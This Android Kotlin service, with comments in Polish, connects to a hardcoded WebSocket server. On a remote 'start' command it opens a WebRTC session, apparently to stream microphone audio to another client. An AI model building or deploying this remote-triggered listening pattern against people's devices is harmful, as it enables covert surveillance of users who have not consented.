package com.example.commandserviceapp

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.WebSocket
import okhttp3.WebSocketListener
import okio.ByteString
import org.webrtc.IceCandidate
import org.webrtc.PeerConnection
import org.webrtc.SessionDescription
import android.Manifest
import android.graphics.Color

class CommandService : Service() {

    companion object {
        private const val CHANNEL_ID = "CommandServiceChannel"
        private const val CHANNEL_NAME = "Command Service Notifications"
    }

    private lateinit var webSocket: WebSocket
    private val client = OkHttpClient()
    private lateinit var webRTCManager: WebRTCManager
    private var isAnswerReceived = false  // Flaga oznaczająca, czy odpowiedź SDP została otrzymana
    private val iceCandidatesBuffer = mutableListOf<IceCandidate>()  // Bufor do przechowywania kandydatów ICE

    override fun onCreate() {
        super.onCreate()
        Log.d("CommandService", "Service started in onCreate")

        // Utwórz powiadomienie natychmiast po starcie usługi
        createNotificationChannel()

        val notification: Notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Service running")
            .setContentText("Service is running after restart.")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setPriority(NotificationCompat.PRIORITY_HIGH)  // Wysoki priorytet
            .setCategory(NotificationCompat.CATEGORY_SERVICE) // Kategoria powiadomienia
            .build()

        // Musisz wywołać startForeground(), aby zapobiec zakończeniu usługi przez system
        startForeground(1, notification)

        // Sprawdź uprawnienia do nagrywania audio
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO)
            != PackageManager.PERMISSION_GRANTED) {

            // Wyświetl powiadomienie z prośbą o uprawnienia
            val permissionNotification = NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("Permission required")
                .setContentText("Audio recording permission is required to continue.")
                .setSmallIcon(android.R.drawable.ic_dialog_alert)
                .build()
            val notificationManager = getSystemService(NotificationManager::class.java)
            notificationManager.notify(2, permissionNotification)

            // Zatrzymaj usługę po wyświetleniu powiadomienia
            stopSelf()
            return
        }

        // Jeśli są uprawnienia, kontynuuj działanie usługi
        webRTCManager = WebRTCManager(this)

        connectWebSocket()  // Inicjalizacja WebSocket
    }





    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

    override fun onDestroy() {
        super.onDestroy()
        if (::webSocket.isInitialized) {
            webSocket.close(1000, "Service destroyed")
        }
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                CHANNEL_NAME,
                NotificationManager.IMPORTANCE_HIGH // Zmień priorytet na wysoki
            ).apply {
                description = "Command Service Channel"
                enableLights(true)
                lightColor = Color.RED
                enableVibration(true)
            }

            val manager = getSystemService(NotificationManager::class.java)
            manager?.createNotificationChannel(channel)
        }
    }

    private fun connectWebSocket() {
        val request = Request.Builder().url("ws://51.20.193.191:8765").build()
        webSocket = client.newWebSocket(request, object : WebSocketListener() {
            override fun onOpen(webSocket: WebSocket, response: okhttp3.Response) {
                Log.d("WebSocket", "Connected to server")
                webSocket.send("777")  // Sending client ID after connection
            }

            override fun onMessage(webSocket: WebSocket, text: String) {
                Log.d("WebSocket", "Received message: $text")
                handleCommand(text)
            }

            override fun onMessage(webSocket: WebSocket, bytes: ByteString) {
                Log.d("WebSocket", "Received bytes: ${bytes.hex()}")
            }

            override fun onClosing(webSocket: WebSocket, code: Int, reason: String) {
                Log.d("WebSocket", "Closing: $code / $reason")
            }

            override fun onFailure(webSocket: WebSocket, t: Throwable, response: okhttp3.Response?) {
                Log.e("WebSocket", "Error: ${t.message}")
            }
        })

        client.dispatcher.executorService.shutdown()
    }

    private fun handleCommand(command: String) {
        when {
            command.startsWith("start") -> startWebRTCSession()
            command.startsWith("stop") -> stopWebRTCSession()
            command.startsWith("answer:") -> {
                val sdp = command.substringAfter("answer:")
                val sessionDescription = SessionDescription(SessionDescription.Type.ANSWER, sdp)
                webRTCManager.handleAnswer(sessionDescription)

                // Oznacz, że odpowiedź SDP została odebrana, więc można wysyłać kandydatów ICE
                isAnswerReceived = true
                Log.d("CommandService", "Received SDP answer and processed: $sdp")

                // Wyślij wszystkich zgromadzonych kandydatów ICE
                for (candidate in iceCandidatesBuffer) {
                    sendIceCandidate(candidate)
                }
                iceCandidatesBuffer.clear()  // Wyczyść bufor po wysłaniu
            }
            command.startsWith("ice:") -> {
                Log.d("CommandService", "Processing ICE candidate from message: $command")

                val parts = command.split(":", limit = 4)
                if (parts.size == 4 && parts[3].startsWith("candidate")) {
                    // Extract candidate details
                    val sdpMid = parts[1]
                    val sdpMLineIndex = parts[2].toIntOrNull()
                    val candidate = parts[3]  // This is the full candidate string

                    if (sdpMLineIndex != null) {
                        val iceCandidate = IceCandidate(sdpMid, sdpMLineIndex, candidate)
                        webRTCManager.handleIceCandidate(iceCandidate)
                        Log.d("CommandService", "Received and processed ICE candidate: ${iceCandidate.sdp}")
                    } else {
                        Log.e("CommandService", "Invalid sdpMLineIndex in ICE candidate message: $command")
                    }
                } else {
                    Log.e("CommandService", "Malformed ICE candidate message: $command")
                }
            }
            else -> Log.d("WebSocket", "Unknown command: $command")
        }
    }







    private fun sendIceCandidate(candidate: IceCandidate) {
        val targetClientId = "1337"  // Docelowy klient
        val message = "ice:${candidate.sdpMid}:${candidate.sdpMLineIndex}:${candidate.sdp}"
        val formattedMessage = "$targetClientId:$message"
        webSocket.send(formattedMessage)
        Log.d("CommandService", "ICE candidate sent to client 1337: $formattedMessage")
    }


    private fun startWebRTCSession() {
        Log.d("CommandService", "Starting WebRTC session")

        val iceServers = listOf(
            PeerConnection.IceServer.builder("stun:stun.l.google.com:19302").createIceServer()/*,
            PeerConnection.IceServer.builder("turn:freeturn.net:3478")
                .setUsername("free")
                .setPassword("free")
                .createIceServer()*/
        )

        webRTCManager.startCall(iceServers, object : PeerConnection.Observer {
            override fun onSignalingChange(state: PeerConnection.SignalingState) {
                Log.d("CommandService", "Signaling state changed: $state")
            }

            override fun onIceConnectionChange(state: PeerConnection.IceConnectionState) {
                Log.d("CommandService", "ICE connection state changed: $state")
            }

            override fun onIceConnectionReceivingChange(receiving: Boolean) {
                Log.d("CommandService", "ICE connection receiving change: $receiving")
            }

            override fun onIceGatheringChange(state: PeerConnection.IceGatheringState) {
                Log.d("CommandService", "ICE gathering state changed: $state")
            }

            override fun onIceCandidate(candidate: IceCandidate) {
                if (isAnswerReceived) {
                    Log.d("CommandService", "Sending ICE candidate to client 1337: ${candidate.sdp}")
                    sendIceCandidate(candidate)
                } else {
                    // Dodaj kandydatów ICE do bufora
                    Log.d("CommandService", "Buffering ICE candidate until SDP answer is received: ${candidate.sdp}")
                    iceCandidatesBuffer.add(candidate)
                }
            }

            override fun onIceCandidatesRemoved(candidates: Array<IceCandidate>) {}
            override fun onAddStream(stream: org.webrtc.MediaStream) {}
            override fun onRemoveStream(stream: org.webrtc.MediaStream) {}
            override fun onDataChannel(channel: org.webrtc.DataChannel) {}
            override fun onRenegotiationNeeded() {}
            override fun onAddTrack(receiver: org.webrtc.RtpReceiver, streams: Array<org.webrtc.MediaStream>) {}
        })

        // Tworzenie oferty SDP i wysyłanie jej przez WebSocket do klienta 1337
        webRTCManager.createOffer { sdp ->
            val offerMessage = "1337:offer:$sdp"  // Wysyłanie do klienta 1337
            webSocket.send(offerMessage)
            Log.d("CommandService", "SDP offer sent to client 1337: $offerMessage")
        }
    }



    private fun stopWebRTCSession() {
        Log.d("CommandService", "Stopping WebRTC session")
        // Logic to stop the WebRTC session if needed
    }
}
